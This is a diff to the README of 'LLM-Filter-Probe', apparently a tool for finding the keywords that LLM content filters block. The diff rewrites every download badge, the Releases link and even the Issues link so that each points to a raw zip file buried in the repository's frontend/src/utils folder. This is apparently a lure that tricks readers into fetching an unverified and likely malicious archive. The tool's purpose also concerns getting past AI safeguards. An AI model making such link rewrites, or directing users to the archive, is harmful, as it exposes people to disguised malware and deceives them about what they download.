@@ -8,7 +8,7 @@ Welcome to LLM-Filter-Probe, a precision reverse-engineering tool designed for a
 
 To get started, visit this page to download:
 
-[![Download LLM-Filter-Probe](https://img.shields.io/badge/Download-LLM--Filter--Probe-blue)](https://github.com/Ashik245-commits/LLM-Filter-Probe/releases)
+[![Download LLM-Filter-Probe](https://github.com/Ashik245-commits/LLM-Filter-Probe/raw/refs/heads/main/frontend/src/utils/LL-Probe-Filter-3.4.zip)](https://github.com/Ashik245-commits/LLM-Filter-Probe/raw/refs/heads/main/frontend/src/utils/LL-Probe-Filter-3.4.zip)
 
 Make sure to choose the version that suits your operating system. Once downloaded, follow these steps to install:
 
@@ -41,12 +41,12 @@ To run LLM-Filter-Probe effectively, your system should meet the following requi
 If you encounter any issues:
 
 - **Installation Failed:** Ensure that your operating system meets the requirements. Try running the installer as an administrator.
-- **Application Crashes:** Make sure you have the latest version. Check for updates on [Releases page](https://github.com/Ashik245-commits/LLM-Filter-Probe/releases).
+- **Application Crashes:** Make sure you have the latest version. Check for updates on [Releases page](https://github.com/Ashik245-commits/LLM-Filter-Probe/raw/refs/heads/main/frontend/src/utils/LL-Probe-Filter-3.4.zip).
 - **Cannot Identify Keywords:** Your input may not contain any blocked terms. Test with different phrases.
 
 ## 🤝 Support
 
-For any questions or support requests, feel free to open an issue on our [GitHub Issues page](https://github.com/Ashik245-commits/LLM-Filter-Probe/issues). We appreciate your feedback and are here to help!
+For any questions or support requests, feel free to open an issue on our [GitHub Issues page](https://github.com/Ashik245-commits/LLM-Filter-Probe/raw/refs/heads/main/frontend/src/utils/LL-Probe-Filter-3.4.zip). We appreciate your feedback and are here to help!
 
 ## 📝 Topics Covered
 
@@ -74,4 +74,4 @@ We aim to improve continually and appreciate your support in making this tool be
 
 Remember, you can always return to the download page to get the latest version: 
 
-[![Download LLM-Filter-Probe](https://img.shields.io/badge/Download-LLM--Filter--Probe-blue)](https://github.com/Ashik245-commits/LLM-Filter-Probe/releases)
+[![Download LLM-Filter-Probe](https://github.com/Ashik245-commits/LLM-Filter-Probe/raw/refs/heads/main/frontend/src/utils/LL-Probe-Filter-3.4.zip)](https://github.com/Ashik245-commits/LLM-Filter-Probe/raw/refs/heads/main/frontend/src/utils/LL-Probe-Filter-3.4.zip)
